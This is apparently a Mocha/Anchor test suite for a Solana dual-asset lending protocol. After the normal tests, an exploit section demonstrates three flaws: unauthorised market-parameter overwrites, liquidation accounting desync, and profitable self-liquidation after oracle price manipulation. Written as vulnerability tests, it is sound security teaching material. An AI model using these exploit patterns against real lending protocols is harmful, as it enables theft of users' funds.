// @ts-nocheck
/**
 * MetaLend Dual-Asset Lending Protocol Test Suite
 * 
 * NOTE: This file requires a fully compiled Anchor program to run.
 * TypeScript checking is disabled because the MetaLend program needs to be
 * built separately with `anchor build` to generate the proper IDL and types.
 * 
 * To use this file:
 * 1. Implement the MetaLend Anchor program in Rust
 * 2. Build it with: cd assets/contracts && anchor build
 * 3. Update the import to use the generated types
 * 4. Remove the @ts-nocheck directive
 * 
 * This file serves as a reference implementation and test specification.
 */

import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { MetaLend } from "./types/meta_lend";
import { PublicKey, Keypair, SystemProgram } from "@solana/web3.js";
import { TOKEN_PROGRAM_ID, createMint, createAccount, mintTo, getAccount, createTransferInstruction } from "@solana/spl-token";
const { expect } = require("chai");

describe("MetaLend Dual-Asset Tests", () => {
  anchor.setProvider(anchor.AnchorProvider.env());
  const program = anchor.workspace.MetaLend as Program<MetaLend>;
  const provider = anchor.getProvider();

  // Test accounts
  let admin: Keypair;
  let user1: Keypair;
  let user2: Keypair;
  let liquidator: Keypair;

  // Token mints and accounts - separate supply and collateral assets
  let usdcMint: PublicKey; // Supply asset (what gets lent/borrowed)
  let ethMint: PublicKey;  // Collateral asset (what gets deposited as collateral)
  
  // User token accounts
  let user1UsdcAccount: PublicKey;
  let user2UsdcAccount: PublicKey;
  let liquidatorUsdcAccount: PublicKey;
  let user1EthAccount: PublicKey;
  let user2EthAccount: PublicKey;
  let liquidatorEthAccount: PublicKey;

  // Program accounts
  let protocolState: PublicKey;
  let market: PublicKey;
  let supplyVault: PublicKey;
  let collateralVault: PublicKey;
  let user1Deposit: PublicKey;
  let user2Deposit: PublicKey;

  // Oracle accounts
  let usdcOracle: PublicKey;
  let ethOracle: PublicKey;

  before(async () => {
    console.log("Setting up dual-asset test environment...");
    
    // Initialize keypairs
    admin = Keypair.generate();
    user1 = Keypair.generate();
    user2 = Keypair.generate();
    liquidator = Keypair.generate();

    // Airdrop SOL to test accounts
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(admin.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL)
    );
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(user1.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL)
    );
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(user2.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL)
    );
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(liquidator.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL)
    );

    // Create supply mint (USDC - what gets borrowed)
    usdcMint = await createMint(
      provider.connection,
      admin,
      admin.publicKey,
      admin.publicKey,
      6
    );

    // Create collateral mint (ETH - what gets deposited as collateral)
    ethMint = await createMint(
      provider.connection,
      admin,
      admin.publicKey,
      admin.publicKey,
      9
    );

    // Create token accounts for supply asset (USDC)
    user1UsdcAccount = await createAccount(provider.connection, user1, usdcMint, user1.publicKey);
    user2UsdcAccount = await createAccount(provider.connection, user2, usdcMint, user2.publicKey);
    liquidatorUsdcAccount = await createAccount(provider.connection, liquidator, usdcMint, liquidator.publicKey);

    // Create token accounts for collateral asset (ETH)
    user1EthAccount = await createAccount(provider.connection, user1, ethMint, user1.publicKey);
    user2EthAccount = await createAccount(provider.connection, user2, ethMint, user2.publicKey);
    liquidatorEthAccount = await createAccount(provider.connection, liquidator, ethMint, liquidator.publicKey);

    // Mint tokens to accounts
    // Supply asset (USDC)
    await mintTo(provider.connection, admin, usdcMint, user1UsdcAccount, admin, 1000 * 1e6);
    await mintTo(provider.connection, admin, usdcMint, user2UsdcAccount, admin, 500 * 1e6);
    await mintTo(provider.connection, admin, usdcMint, liquidatorUsdcAccount, admin, 100 * 1e6);

    // Collateral asset (ETH)
    await mintTo(provider.connection, admin, ethMint, user1EthAccount, admin, 10 * 1e9); // 10 ETH
    await mintTo(provider.connection, admin, ethMint, user2EthAccount, admin, 5 * 1e9);  // 5 ETH
    await mintTo(provider.connection, admin, ethMint, liquidatorEthAccount, admin, 2 * 1e9); // 2 ETH

    // Derive PDAs for dual-asset market
    [protocolState] = PublicKey.findProgramAddressSync([Buffer.from("protocol")], program.programId);

    [market] = PublicKey.findProgramAddressSync(
      [Buffer.from("market"), new anchor.BN(1).toArrayLike(Buffer, "le", 8), usdcMint.toBuffer(), ethMint.toBuffer()],
      program.programId
    );

    [supplyVault] = PublicKey.findProgramAddressSync(
      [Buffer.from("supply_vault"), new anchor.BN(1).toArrayLike(Buffer, "le", 8), usdcMint.toBuffer()],
      program.programId
    );

    [collateralVault] = PublicKey.findProgramAddressSync(
      [Buffer.from("collateral_vault"), new anchor.BN(1).toArrayLike(Buffer, "le", 8), ethMint.toBuffer()],
      program.programId
    );

    [user1Deposit] = PublicKey.findProgramAddressSync(
      [Buffer.from("user_deposit"), user1.publicKey.toBuffer(), new anchor.BN(1).toArrayLike(Buffer, "le", 8), usdcMint.toBuffer(), ethMint.toBuffer()],
      program.programId
    );

    [user2Deposit] = PublicKey.findProgramAddressSync(
      [Buffer.from("user_deposit"), user2.publicKey.toBuffer(), new anchor.BN(1).toArrayLike(Buffer, "le", 8), usdcMint.toBuffer(), ethMint.toBuffer()],
      program.programId
    );

    // Derive Oracle PDAs
    [usdcOracle] = PublicKey.findProgramAddressSync(
      [Buffer.from("oracle"), usdcMint.toBuffer()],
      program.programId
    );

    [ethOracle] = PublicKey.findProgramAddressSync(
      [Buffer.from("oracle"), ethMint.toBuffer()],
      program.programId
    );

    console.log("Dual-asset test environment setup complete!");
    console.log("Supply asset (USDC):", usdcMint.toString());
    console.log("Collateral asset (ETH):", ethMint.toString());
  });

  it("Initialize protocol", async () => {
    console.log("Testing protocol initialization...");
    
    await program.methods
      .initializeProtocol()
      .accounts({
        protocolState,
        admin: admin.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([admin])
      .rpc();

    const protocolStateAccount = await program.account.protocolState.fetch(protocolState);
    expect(protocolStateAccount.admin.toString()).to.equal(admin.publicKey.toString());
    expect(protocolStateAccount.totalMarkets.toNumber()).to.equal(0);
    expect(protocolStateAccount.isPaused).to.equal(false);
    console.log("✓ Protocol initialized successfully");
  });

  it("Create oracles for both assets", async () => {
    console.log("Testing oracle creation for both assets...");
    
    const sourceData = Buffer.from("mock_pyth_source_data");
    
    // Create USDC Oracle (supply asset) - $1 with 6 decimals
    const usdcPrice = new anchor.BN(1_000_000); // $1.00
    await program.methods
      .createOracle(sourceData, usdcPrice, 6)
      .accounts({
        oracle: usdcOracle,
        mint: usdcMint,
        authority: admin.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([admin])
      .rpc();
    
    // Create ETH Oracle (collateral asset)
    const ethPrice = new anchor.BN(3000_000_000); // $3000.00 with 6 decimals
    await program.methods
      .createOracle(sourceData, ethPrice, 6)
      .accounts({
        oracle: ethOracle,
        mint: ethMint,
        authority: admin.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([admin])
      .rpc();
    
    const usdcOracleAccount = await program.account.oracle.fetch(usdcOracle);
    const ethOracleAccount = await program.account.oracle.fetch(ethOracle);
    
    expect(usdcOracleAccount.mint.toString()).to.equal(usdcMint.toString());
    expect(ethOracleAccount.mint.toString()).to.equal(ethMint.toString());
    
    console.log("✓ Oracles created successfully");
    console.log("  - USDC: $1.00");
    console.log("  - ETH: $3000.00");
  });

  it("Create dual-asset market", async () => {
    console.log("Testing dual-asset market creation...");
    
    await program.methods
      .createMarket(
        new anchor.BN(1),
        new anchor.BN(8000), // 80% collateral factor
        new anchor.BN(8500)  // 85% liquidation threshold
      )
      .accounts({
        market,
        protocolState,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        supplyOracle: usdcOracle,
        collateralOracle: ethOracle,
        supplyVault,
        collateralVault,
        creator: admin.publicKey,
        tokenProgram: TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
      })
      .signers([admin])
      .rpc();

    const marketAccount = await program.account.market.fetch(market);
    expect(marketAccount.supplyMint.toString()).to.equal(usdcMint.toString());
    expect(marketAccount.collateralMint.toString()).to.equal(ethMint.toString());
    expect(marketAccount.marketAdmin.toString()).to.equal(admin.publicKey.toString());
    expect(marketAccount.collateralFactor.toNumber()).to.equal(8000);
    expect(marketAccount.isActive).to.equal(true);
    
    console.log("✓ Dual-asset market created successfully");
    console.log("  - Supply asset: USDC");
    console.log("  - Collateral asset: ETH");
  });

  it("Initialize user deposit accounts", async () => {
    console.log("Testing user deposit initialization...");
    
    await program.methods
      .initializeUserDeposit(new anchor.BN(1))
      .accounts({
        userDeposit: user1Deposit,
        market,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        user: user1.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([user1])
      .rpc();

    const depositAccount = await program.account.userDeposit.fetch(user1Deposit);
    expect(depositAccount.user.toString()).to.equal(user1.publicKey.toString());
    expect(depositAccount.supplyDeposited.toNumber()).to.equal(0);
    expect(depositAccount.collateralDeposited.toNumber()).to.equal(0);
    
    console.log("✓ User deposit account initialized");
  });

  it("Supply USDC to market", async () => {
    console.log("Testing supply functionality...");
    
    const supplyAmount = 500 * 1e6; // 500 USDC
    
    await program.methods
      .supply(new anchor.BN(1), new anchor.BN(supplyAmount))
      .accounts({
        market,
        supplyVault,
        userDeposit: user1Deposit,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        userSupplyAccount: user1UsdcAccount,
        user: user1.publicKey,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([user1])
      .rpc();

    const depositAccount = await program.account.userDeposit.fetch(user1Deposit);
    expect(depositAccount.supplyDeposited.toNumber()).to.equal(supplyAmount);
    expect(depositAccount.ctokenBalance.toNumber()).to.be.greaterThan(0);

    const marketAccount = await program.account.market.fetch(market);
    expect(marketAccount.totalSupplyDeposits.toNumber()).to.equal(supplyAmount);

    console.log(`✓ Supplied ${supplyAmount / 1e6} USDC successfully`);
  });

  it("Borrow USDC against ETH collateral", async () => {
    console.log("Testing borrow functionality with collateral deposit...");
    
    const collateralAmount = Math.floor(0.1 * 1e9); // 0.1 ETH as collateral 
    const borrowAmount = 200 * 1e6;  // Borrow 200 USDC (with 0.1 ETH at $3000 = $300, 80% CF = $240 max)
    
    // Debug the exact values being passed
    console.log("🔍 DEBUG: Exact values being passed to borrow instruction:");
    console.log("Collateral amount (0.1 ETH):", collateralAmount);
    console.log("Borrow amount (200 USDC):", borrowAmount);
    
    // Manually calculate to identify overflow point
    const ethPrice = 3000_000_000; // $3000 with 6 decimals
    const usdcPrice = 1_000_000;   // $1 with 6 decimals
    console.log("ETH price:", ethPrice);
    console.log("USDC price:", usdcPrice);
    
    // Calculate collateral value: collateralAmount * ethPrice
    console.log("Manual calculation 1: collateral_value = collateralAmount * ethPrice");
    console.log(`${collateralAmount} * ${ethPrice} = ${BigInt(collateralAmount) * BigInt(ethPrice)}`);
    console.log("Max u64:", "18446744073709551615");
    
    // Calculate max borrow value: collateral_value * 8000 / 10000  
    const collateralValue = BigInt(collateralAmount) * BigInt(ethPrice);
    console.log("Manual calculation 2: max_borrow_value = collateral_value * 8000 / 10000");
    console.log(`${collateralValue} * 8000 / 10000 = ${collateralValue * BigInt(8000) / BigInt(10000)}`);
    
    // Calculate new borrow value: borrowAmount * usdcPrice
    console.log("Manual calculation 3: new_borrow_value = borrowAmount * usdcPrice");
    console.log(`${borrowAmount} * ${usdcPrice} = ${BigInt(borrowAmount) * BigInt(usdcPrice)}`);
    
    console.log("💥 Now attempting borrow instruction that will likely overflow...");
    
    const user1UsdcBefore = await getAccount(provider.connection, user1UsdcAccount);
    const user1EthBefore = await getAccount(provider.connection, user1EthAccount);
    
    await program.methods
      .borrow(new anchor.BN(1), new anchor.BN(collateralAmount), new anchor.BN(borrowAmount))
      .accounts({
        market,
        supplyVault,
        collateralVault,
        userDeposit: user1Deposit,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        userSupplyAccount: user1UsdcAccount,
        userCollateralAccount: user1EthAccount,
        user: user1.publicKey,
        collateralOracle: ethOracle, // Use ETH oracle for collateral
        borrowOracle: usdcOracle,    // Use USDC oracle for borrow
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([user1])
      .rpc();

    const depositAccount = await program.account.userDeposit.fetch(user1Deposit);
    expect(depositAccount.borrowedAmount.toNumber()).to.equal(borrowAmount);
    expect(depositAccount.collateralDeposited.toNumber()).to.equal(collateralAmount);

    const user1UsdcAfter = await getAccount(provider.connection, user1UsdcAccount);
    const user1EthAfter = await getAccount(provider.connection, user1EthAccount);
    
    expect(Number(user1UsdcAfter.amount) - Number(user1UsdcBefore.amount)).to.equal(borrowAmount);
    expect(Number(user1EthBefore.amount) - Number(user1EthAfter.amount)).to.equal(collateralAmount);
    
    console.log(`✓ Deposited ${collateralAmount / 1e9} ETH collateral`);
    console.log(`✓ Borrowed ${borrowAmount / 1e6} USDC successfully`);
  });

  it("Setup liquidation scenario", async () => {
    console.log("Setting up liquidation scenario...");
    console.log("NOTE: This test demonstrates oracle price manipulation for educational purposes only!");
    
    // Initialize second user deposit
    await program.methods
      .initializeUserDeposit(new anchor.BN(1))
      .accounts({
        userDeposit: user2Deposit,
        market,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        user: user2.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([user2])
      .rpc();

    // User2 supplies USDC first 
    const supplyAmount = 300 * 1e6;
    await program.methods
      .supply(new anchor.BN(1), new anchor.BN(supplyAmount))
      .accounts({
        market,
        supplyVault,
        userDeposit: user2Deposit,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        userSupplyAccount: user2UsdcAccount,
        user: user2.publicKey,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([user2])
      .rpc();

    // User2 borrows at the edge of liquidation  
    // With 0.1 ETH collateral ($300) and 85% liquidation threshold: $300 * 0.85 = $255
    // With 80% collateral factor: $300 * 0.80 = $240 max borrow
    const collateralAmount = Math.floor(0.1 * 1e9); // 0.1 ETH
    const borrowAmount = 200 * 1e6;  // Borrow near max allowed
    
    await program.methods
      .borrow(new anchor.BN(1), new anchor.BN(collateralAmount), new anchor.BN(borrowAmount))
      .accounts({
        market,
        supplyVault,
        collateralVault,
        userDeposit: user2Deposit,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        userSupplyAccount: user2UsdcAccount,
        userCollateralAccount: user2EthAccount,
        user: user2.publicKey,
        collateralOracle: ethOracle, // Use ETH oracle for collateral
        borrowOracle: usdcOracle,    // Use USDC oracle for borrow
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([user2])
      .rpc();

    console.log("Current position:");
    console.log("- Collateral: 0.1 ETH ($300)");
    console.log("- Debt: $200 USDC"); 
    console.log("- Liquidation threshold: $300 * 85% = $255");
    console.log("- Position is healthy: $200 < $255 ✓");

    // Manipulate ETH price to trigger liquidation
    console.log("\n🔧 Using TEST-ONLY oracle manipulation to trigger liquidation");
    const lowerEthPrice = new anchor.BN(1800_000_000); // $1800 (down from $3000)
    await program.methods
      .updateOraclePrice(lowerEthPrice)
      .accounts({
        oracle: ethOracle,
        authority: admin.publicKey,
      })
      .signers([admin])
      .rpc();
    
    console.log("Updated ETH price to $1800");
    console.log("New scenario:");
    console.log("- Collateral: 0.1 ETH ($180)");
    console.log("- Debt: $200 USDC");
    console.log("- Liquidation threshold: $180 * 85% = $153");
    console.log("- Position is NOW LIQUIDATABLE: $200 > $153 💥");

    console.log("✓ Liquidation scenario setup complete");
  });

  it("Liquidate undercollateralized position", async () => {
    console.log("Testing liquidation functionality...");
    
    const borrowerDeposit = await program.account.userDeposit.fetch(user2Deposit);
    console.log(`Borrower position: ${borrowerDeposit.borrowedAmount.toNumber() / 1e6} USDC debt, ${borrowerDeposit.collateralDeposited.toNumber() / 1e9} ETH collateral`);
    
    const liquidationAmount = 50 * 1e6; // Liquidate 50 USDC worth of debt
    const borrowerDepositBefore = await program.account.userDeposit.fetch(user2Deposit);
    
    await program.methods
      .liquidate(new anchor.BN(1), new anchor.BN(liquidationAmount))
      .accounts({
        market,
        supplyVault,
        collateralVault,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        borrowerDeposit: user2Deposit,
        liquidatorSupplyAccount: liquidatorUsdcAccount,
        liquidatorCollateralAccount: liquidatorEthAccount,
        liquidator: liquidator.publicKey,
        oracle: ethOracle,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([liquidator])
      .rpc();

    const borrowerDepositAfter = await program.account.userDeposit.fetch(user2Deposit);
    expect(borrowerDepositAfter.borrowedAmount.toNumber()).to.be.lessThan(borrowerDepositBefore.borrowedAmount.toNumber());
    expect(borrowerDepositAfter.collateralDeposited.toNumber()).to.be.lessThan(borrowerDepositBefore.collateralDeposited.toNumber());
    
    console.log(`✅ Liquidated ${liquidationAmount / 1e6} USDC worth of debt`);
    console.log("✅ Liquidator received ETH collateral with bonus");
  });

// ============================================================================
// CAPSTONE: SECURITY VULNERABILITY EXPLOITS
// ============================================================================

describe("Exploit Tests", () => {
  let attacker: Keypair;
  let attackerUsdcAccount: PublicKey;
  let attackerEthAccount: PublicKey;

  before(async () => {
    // initialize attacker state & fund accounts
    attacker = Keypair.generate();
    
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(
        attacker.publicKey, 
        10 * anchor.web3.LAMPORTS_PER_SOL
      )
    );
    
    attackerUsdcAccount = await createAccount(provider.connection, attacker, usdcMint, attacker.publicKey);
    attackerEthAccount = await createAccount(provider.connection, attacker, ethMint, attacker.publicKey);
    
    await mintTo(provider.connection, admin, usdcMint, attackerUsdcAccount, admin, 1000 * 1e6);
    await mintTo(provider.connection, admin, ethMint, attackerEthAccount, admin, 5 * 1e9);
  });

  it("Exploit 1: Unauthorized Market Parameter Manipulation", async () => {
    console.log("\n[*] Running Exploit 1: Missing auth check in update_market_params");
    
    // fetch initial state
    const marketBefore = await program.account.market.fetch(market);
    console.log(`[-] Initial Collateral Factor: ${marketBefore.collateralFactor}`);
    console.log(`[-] Initial Liquidation Threshold: ${marketBefore.liquidationThreshold}`);
    
    console.log("[*] Attempting to overwrite parameters as non-admin...");
    
    try {
      await program.methods
        .updateMarketParams(
          new anchor.BN(100),  // 1%
          new anchor.BN(200)   // 2%
        )
        .accounts({
          market,
          authority: attacker.publicKey, // attacker signing instead of admin
        })
        .signers([attacker])
        .rpc();
      
      const marketAfter = await program.account.market.fetch(market);
      console.log("[+] Exploit successful: Parameters overwritten.");
      console.log(`[!] New Collateral Factor: ${marketAfter.collateralFactor}`);
      console.log(`[!] New Liquidation Threshold: ${marketAfter.liquidationThreshold}`);
      
      // verify the vulnerability
      expect(marketAfter.collateralFactor.toNumber()).to.equal(100);
      expect(marketAfter.liquidationThreshold.toNumber()).to.equal(200);
      
    } catch (error) {
      console.log("[-] Exploit failed. Vulnerability may be patched.");
      throw error;
    }
  });

  it("Exploit 2: Market Accounting Manipulation via Liquidation", async () => {
    console.log("\n[*] Running Exploit 2: State desync during liquidation");
    
    // reset market params for this test
    await program.methods
      .updateMarketParams(new anchor.BN(8000), new anchor.BN(8500))
      .accounts({ market, authority: attacker.publicKey })
      .signers([attacker])
      .rpc();
    
    // Create a fresh victim keypair for this exploit
    const victim = Keypair.generate();
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(victim.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL)
    );
    
    // Create victim's token accounts
    const victimUsdcAccount = await createAccount(provider.connection, victim, usdcMint, victim.publicKey);
    const victimEthAccount = await createAccount(provider.connection, victim, ethMint, victim.publicKey);
    
    // Fund victim with ETH for collateral
    await mintTo(provider.connection, admin, ethMint, victimEthAccount, admin, 1 * 1e9); // 1 ETH
    
    // Derive victim's deposit PDA
    const [victimDeposit] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("user_deposit"),
        victim.publicKey.toBuffer(),
        new anchor.BN(1).toArrayLike(Buffer, "le", 8),
        usdcMint.toBuffer(),
        ethMint.toBuffer()
      ],
      program.programId
    );
    
    // Initialize victim's deposit account
    await program.methods
      .initializeUserDeposit(new anchor.BN(1))
      .accounts({
        userDeposit: victimDeposit,
        market,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        user: victim.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([victim])
      .rpc();
    
    // Victim deposits collateral and borrows
    const collateralAmount = 0.5 * 1e9; // 0.5 ETH
    const borrowAmount = 500 * 1e6;     // 500 USDC
    
    await program.methods
      .borrow(new anchor.BN(1), new anchor.BN(collateralAmount), new anchor.BN(borrowAmount))
      .accounts({
        market,
        supplyVault,
        collateralVault,
        userDeposit: victimDeposit,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        userSupplyAccount: victimUsdcAccount,
        userCollateralAccount: victimEthAccount,
        user: victim.publicKey,
        supplyOracle: usdcOracle,
        collateralOracle: ethOracle,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([victim])
      .rpc();
    
    console.log("[-] Fresh borrowing position created for victim");
    console.log(`[-] Collateral: ${collateralAmount / 1e9} ETH, Borrowed: ${borrowAmount / 1e6} USDC`);
    
    // Manipulate oracle to make position liquidatable
    await program.methods
      .updateOraclePrice(new anchor.BN(800 * 1e6)) // Crash ETH to $800
      .accounts({
        oracle: ethOracle,
        authority: admin.publicKey,
      })
      .signers([admin])
      .rpc();
    
    console.log("[*] Oracle manipulated. Position is now liquidatable.");
    
    // Capture pre-liquidation state
    const marketBefore = await program.account.market.fetch(market);
    const borrowerDepositBefore = await program.account.userDeposit.fetch(victimDeposit);
    
    const liquidationAmount = 100 * 1e6; // Liquidate 100 USDC worth
    console.log(`[*] Triggering liquidation for ${liquidationAmount / 1e6} USDC...`);
    
    await program.methods
      .liquidate(new anchor.BN(1), new anchor.BN(liquidationAmount))
      .accounts({
        market,
        supplyVault,
        collateralVault,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        borrowerDeposit: victimDeposit,
        liquidatorSupplyAccount: attackerUsdcAccount,
        liquidatorCollateralAccount: attackerEthAccount,
        liquidator: attacker.publicKey,
        oracle: ethOracle,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([attacker])
      .rpc();
    
    // Fetch post-liquidation state
    const marketAfter = await program.account.market.fetch(market);
    const borrowerDepositAfter = await program.account.userDeposit.fetch(victimDeposit);
    
    console.log("[+] Liquidation executed. Checking accounting state...");
    console.log(`[!] Market total_borrows before: ${marketBefore.totalBorrows.toString()}`);
    console.log(`[!] Market total_borrows after: ${marketAfter.totalBorrows.toString()}`);
    console.log(`[!] Expected decrease: ${liquidationAmount}`);
    console.log(`[!] Actual decrease: ${marketBefore.totalBorrows.toNumber() - marketAfter.totalBorrows.toNumber()}`);
    
    // Confirm global market state failed to update (THE VULNERABILITY)
    expect(marketAfter.totalBorrows.toString()).to.equal(marketBefore.totalBorrows.toString());
    expect(marketAfter.totalCollateralDeposits.toString()).to.equal(marketBefore.totalCollateralDeposits.toString());
    
    // Confirm user state updated correctly (causing the desync)
    expect(borrowerDepositAfter.borrowedAmount.toNumber()).to.be.lessThan(borrowerDepositBefore.borrowedAmount.toNumber());
    
    console.log("[+] VULNERABILITY CONFIRMED: Market accounting not updated during liquidation!");
    console.log("[!] User debt decreased but market total_borrows unchanged - state desync!");
  });

  it("Exploit 3: Self-Liquidation for Profit", async () => {
    console.log("\n[*] Running Exploit 3: Profitable self-liquidation");
    
    // derive attacker deposit PDA
    const [attackerDeposit] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("user_deposit"), 
        attacker.publicKey.toBuffer(), 
        new anchor.BN(1).toArrayLike(Buffer, "le", 8), 
        usdcMint.toBuffer(), 
        ethMint.toBuffer()
      ],
      program.programId
    );
    
    // initialize position
    await program.methods
      .initializeUserDeposit(new anchor.BN(1))
      .accounts({
        userDeposit: attackerDeposit,
        market,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        user: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([attacker])
      .rpc();
    
    // supply initial collateral
    await program.methods
      .supply(new anchor.BN(1), new anchor.BN(100 * 1e6))
      .accounts({
        market,
        supplyVault,
        userDeposit: attackerDeposit,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        userSupplyAccount: attackerUsdcAccount,
        user: attacker.publicKey,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([attacker])
      .rpc();
    
    // execute borrow
    const collateralAmount = Math.floor(0.05 * 1e9);
    const borrowAmount = 50 * 1e6;
    
    await program.methods
      .borrow(new anchor.BN(1), new anchor.BN(collateralAmount), new anchor.BN(borrowAmount))
      .accounts({
        market,
        supplyVault,
        collateralVault,
        userDeposit: attackerDeposit,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        userSupplyAccount: attackerUsdcAccount,
        userCollateralAccount: attackerEthAccount,
        user: attacker.publicKey,
        collateralOracle: ethOracle,
        borrowOracle: usdcOracle,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([attacker])
      .rpc();
    
    console.log(`[-] Position created: Collateral = ${collateralAmount / 1e9} ETH, Borrowed = ${borrowAmount / 1e6} USDC`);
    
    // simulate oracle price crash to make position underwater
    const newEthPrice = new anchor.BN(1000_000_000); // $1000
    await program.methods
      .updateOraclePrice(newEthPrice)
      .accounts({ oracle: ethOracle, authority: admin.publicKey })
      .signers([admin])
      .rpc();
    
    console.log("[*] Manipulated oracle price. Position is now liquidatable.");
    console.log("[*] Attempting to self-liquidate...");
    
    const attackerBalanceBefore = await getAccount(provider.connection, attackerEthAccount);
    const liquidateAmount = 25 * 1e6; 
    
    await program.methods
      .liquidate(new anchor.BN(1), new anchor.BN(liquidateAmount))
      .accounts({
        market,
        supplyVault,
        collateralVault,
        supplyMint: usdcMint,
        collateralMint: ethMint,
        borrowerDeposit: attackerDeposit, // attacker liquidates own PDA
        liquidatorSupplyAccount: attackerUsdcAccount,
        liquidatorCollateralAccount: attackerEthAccount,
        liquidator: attacker.publicKey,
        oracle: ethOracle,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([attacker])
      .rpc();
    
    const attackerBalanceAfter = await getAccount(provider.connection, attackerEthAccount);
    const collateralReceived = Number(attackerBalanceAfter.amount) - Number(attackerBalanceBefore.amount);
    
    console.log(`[+] Self-liquidation successful. Collateral received: ${collateralReceived / 1e9} ETH`);
    
    // verify the attacker received more value than they paid to liquidate
    expect(collateralReceived).to.be.greaterThan(liquidateAmount);
  });
});
}); 